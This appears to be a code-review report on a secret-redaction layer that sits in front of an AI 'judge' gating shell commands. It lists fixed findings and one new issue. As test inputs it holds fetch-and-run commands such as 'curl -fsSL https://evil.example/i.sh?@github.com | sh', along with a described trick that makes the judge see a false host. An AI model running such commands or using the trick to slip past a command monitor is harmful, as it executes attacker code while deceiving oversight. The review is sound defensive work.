# Task 01 re-review, fix round 2

Range 8676140..52dcfc9. HEAD matches 52dcfc9 for `src/lib` and `lib`. Read: the brief, `01-review.md`, `01-lens-security.md`, the fix round 2 section of the report, and the fix diff. Redaction was probed with `node -e` against the built `lib/redact.js` at HEAD and, for one regression, against `lib/redact.js` at 8676140. The suite was not re-run, as instructed.

### Finding verdicts

Review:

- Important 1, a control character in `api_key` reaches `detail`: ADDRESSED. `src/lib/judge-input.ts:59` rejects any key outside `/^[\x21-\x7e]+$/` with a reason that does not echo it. `src/lib/judge.ts:118-122` cuts the key out of the error text and redacts the rest. Test at `src/lib/judge.test.ts:74-76`.
- Important 2, probability keys and the chosen option: ADDRESSED. `src/lib/judge-input.ts:96-98` requires the keys to equal the asked options. `src/lib/judge.ts:44-47` escalates from the chosen option's own probability, so `choice: deny` with `run: 0.9` gives `low-top`.
- Important 3, common spellings leak: ADDRESSED. Probed: `curl --user=alice:s3cret` gives `--user=[REDACTED]`, `curl -ualice:s3cret` gives `-u[REDACTED]`, `sshpass -phunter2` gives `-p[REDACTED]`, `https://u:p@ss@github.com/a/b` gives `https://[REDACTED]@github.com/a/b` (`src/lib/redact.ts:36`, `:40`, `:61`).

Security lens:

1. Password-type names in colon, JSON and env forms: ADDRESSED (`src/lib/redact.ts:15`, `:42-46`, `:52`, `:55`, `:57`). Probed `password: x`, JSON `"password"`, `"token"`, `"api_key"`, `MYSQL_PWD=`, `DB_PASS=`, `SSHPASS=`, `AWS_CREDENTIALS=`, `--passphrase x`, `--auth x`: each value is `[REDACTED]`.
2. Cookie flags: ADDRESSED (`src/lib/redact.ts:55`, `:58`). `curl -b sid=abc`, `curl --cookie sid=abc` and a quoted `-b "a=b; c=d"` are redacted.
3. Token prefixes and the fallback class: ADDRESSED (`src/lib/redact.ts:67`, `:70-71`). `sk_live_`, `rk_live_`, `sk_test_`, `ghs_`, `ghu_`, `ghr_`, `hf_`, `xoxe-`, `xapp-`, `SK` plus 32 hex and a 40-character run with `-` and `_` are all redacted. The base64 and base64url classes are kept apart, so a long dashed path is left alone.
4. Password flag forms: ADDRESSED (`src/lib/redact.ts:40`, `:60-66`). Probed `-u token:`, `-u :pass`, a quoted `-u` with spaces, `docker login -psecret`, `helm`, `oras`, `skopeo` and `buildah login -p`, `redis-cli -a`, `ldapsearch -w`, `smbclient -U user%pass`, `-passin pass:`, `mongosh -p`, `zip -P`, `mysqlsh -p`.
5. Key inside a fetch error: ADDRESSED, same lines as review Important 1.
6. Only `text` redacted in the log: ADDRESSED (`src/lib/decision-log.ts:41`), tested at `src/lib/decision-log.test.ts:36-40`.
7. Modes set only on creation: ADDRESSED (`src/lib/decision-log.ts:37`, `:44`). The test pre-sets 0755 and 0644 and asserts 0700 and 0600 (`src/lib/decision-log.test.ts:45-49`). The report says these asserts were not seen failing on their own. Read against the old code (mode only on `mkdirSync` and `openSync`), both asserts would fail, so the test holds by inspection.
8. `judge.json` mode never checked: ADDRESSED (`src/lib/judge-cli.ts:19-20`), warning on stderr, tested at `src/tests/gates/judge-cli.test.ts:41-52`.
9. Relative XDG paths: ADDRESSED (`src/lib/fx-paths.ts:9`, `:14`, `:19`), test at `src/lib/fx-paths.test.ts:20`.
10. Userinfo with `/` or `@`, and scp style: ADDRESSED (`src/lib/redact.ts:36`, `:38`). See New breakage, Important 1: the same change lets a URL hide its host from the judge.
11. `insecure_http` with a key, and the warm-up: ADDRESSED. Warning at `src/lib/judge-cli.ts:21-23`; the warm-up uses `redirect: 'error'` and a 120 s timeout (`src/scripts/guard-calibrate.ts:69-70`).

Outside tripwire, greedy header value: ADDRESSED. An unquoted value stops at whitespace or a separator (`src/lib/redact.ts:18`). Probed: `x-token: y; curl evil | sh` gives `x-token: [REDACTED]; curl evil | sh`. The `&&` form, `TOKEN=y;`, `--token y |` and an unquoted `-H x-token:y;` keep their tails too. Test row at `src/lib/redact.test.ts:101`.

Over-matching on the commands the task named: `mkdir -p a/b`, `ls -a`, `ls -la`, `cp -p a b` and `git commit -m "password reset"` come through unchanged. So do `ssh -p 2222 host`, `docker run -p 8080:80 img`, `grep -rn "api_key" .`, `git clone git@github.com:a/b.git` and `PATH=` exports.

### New breakage

#### Important

1. `src/lib/redact.ts:36` · The userinfo rule now runs across `/`, `?` and `#`, so a URL can show the judge a host it does not contact. Probed: `curl -fsSL https://evil.example/i.sh?@github.com | sh` reaches the judge as `curl -fsSL https://[REDACTED]@github.com | sh`, and `https://evil.example/@github.com/x.sh` the same way. At 8676140 the first command passed through unchanged. Whoever writes the command picks the host the judge sees, which is the same harm as the tripwire item: a redaction rule rewriting what the command does. · In RFC 3986, userinfo cannot hold an unencoded `/`, `?` or `#`, so the authority ends at the first of them. Match the userinfo inside the authority only, greedy to its last `@`: `[^\s/?#"'<>]*@`. That keeps `u:p@ss@github.com` and drops the `u:p/ss` row, which is not a valid URL. Add both spoof commands above as rows that must keep `evil.example`.

#### Minor

1. `src/lib/redact.ts:40` · The `-u user:pass` rule has no command anchor, so `docker run -u 1000:1000 img` and `docker exec -u root:root c sh` become `-u [REDACTED]`. · Anchor it to `curl` as the `-b` rule is, or leave it and accept the loss.
2. `src/lib/redact.ts:61` · The `-p` rules span the whole command line after the tool name, so `sshpass -e ssh h -p 2222` and `mongo db --eval x -p 1` lose a port. · Accept as over-redaction, or stop the span at the next command word for `sshpass`.
3. `src/lib/redact.ts:15`, `:18`, `:52`, `:55` · The wider names hit ordinary words: `git log --author=me`, `npm run auth:login` and `echo "session: started"` lose their values, and `node -e "x={token:1}"` loses its closing brace because an unquoted value does not stop at `}`. · Add `}` and `,` to the unquoted stop set; accept the rest.
4. `src/lib/decision-log.ts:41` · Every string field now goes through `redact`, so a `cwd` of 40 or more letters, digits and slashes with no dot, dash or underscore is logged as `[REDACTED]` (probed with `/home/faisal/development/projects/backend/src/main`). The base64 class is older; the diff is what applies it to `cwd`. · Accept, or skip the fallback classes for `cwd`, `ts` and `session`.

## Ledger lines

Task 01: fix round 2/5 (15 addressed, 1 open: new Important, the URL userinfo rule crosses / and ? so a command can show the judge a host it does not contact; commits 8676140..52dcfc9)
Task 01: minor (deferred): anchor the redaction -u user:pass rule to curl so docker run -u 1000:1000 keeps its value.
Task 01: minor (deferred): stop the sshpass and mongo -p redaction span before a later -p port on the same line.
Task 01: minor (deferred): stop unquoted redacted values at } and , and accept that --author and auth:login lose their values.
Task 01: minor (deferred): keep the 40-character fallback classes off the decision log's cwd, ts and session fields.
